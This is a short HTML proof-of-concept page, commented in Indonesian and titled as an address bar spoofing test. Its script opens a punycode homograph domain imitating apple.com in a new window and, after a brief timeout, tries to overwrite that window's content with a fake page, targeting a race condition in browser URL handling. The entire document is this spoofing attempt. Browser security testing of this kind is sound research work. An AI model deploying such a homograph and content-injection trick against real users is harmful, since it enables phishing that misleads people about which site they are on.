<!DOCTYPE html>
<html>
<head>
    <title>Address Bar Spoofing Testing</title>
</head>
<body>
    <p>Click The Button Below</p>
    
    <button onclick="triggerSpoof()">Click Here</button>

    <script>
        function triggerSpoof() {
            // 1. Menentukan URL Target yang memanfaatkan celah parser
            // Contoh menggunakan domain homograph atau nested scheme yang sedang diteliti
            var targetUrl = "https://xn--pple-43d.com"; // Unicode: apple.com (tiruan)
            
            // 2. Memicu jendela baru atau navigasi cepat
            var win = window.open(targetUrl, "_blank");
            
            // 3. Pada bug tipe race-condition / timing, penyerang biasanya 
            // memanipulasi dokumen saat status loading belum selesai
            setTimeout(function() {
                try {
                    win.document.body.innerHTML = "<h1>Ini adalah halaman palsu (Spoofed Content)</h1>";
                } catch(e) {
                    console.log("Navigasi diblokir oleh Same-Origin Policy jika parser aman.");
                }
            }, 100);
        }
    </script>
</body>
</html>
